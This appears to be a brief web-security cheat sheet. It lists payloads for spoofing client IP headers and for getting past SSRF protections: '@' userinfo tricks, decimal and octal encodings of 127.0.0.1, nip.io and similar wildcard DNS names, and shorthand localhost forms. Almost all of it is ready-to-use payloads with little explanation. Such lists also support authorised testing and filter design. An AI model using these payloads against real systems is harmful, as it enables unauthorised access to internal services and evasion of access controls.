# IP Spoofing

```
X-Forwarded-For: client1, proxy1, proxy2
X-Forwarded-Host: example.com
Forwarded: for=111.111.111.111;proto=http;by=222.222.222.222
Forwarded: for=111.111.111.111, for=222.222.222.222
```

# Bypass domain whitelisting

```
https://example.com@127.0.0.1
# Deciaml bypass
https://example.com@2130706433
# Octal bypass
https://example.com@017700000001
```

# nip.io

```
http://<anything>[.-]<IP Address>.nip.io
http://welcome.app.127.0.0.1.nip.io
http://example.com.nip.io
```

# Bypass 127.0.0.1/localhost protections

```
# the methods mentioned above and
http://0
http://127.1:80
http://0.0.0.0:80
http://[::]:80
http://[0.0.0.0::1]:80
http://lvh.me
http://localtest.me
http://spoofed.burpcollaborator.net
```